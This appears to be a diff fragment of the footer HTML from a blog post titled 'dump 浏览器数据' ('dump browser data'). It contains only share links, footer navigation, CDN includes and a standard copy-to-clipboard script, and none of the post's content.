+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&text=dump 浏览器数据"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&is_video=false&description=dump 浏览器数据"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=dump 浏览器数据&body=Check out this article: http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&title=dump 浏览器数据"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&name=dump 浏览器数据&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/dump-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%95%B0%E6%8D%AE/&t=dump 浏览器数据"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024
+    wude
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
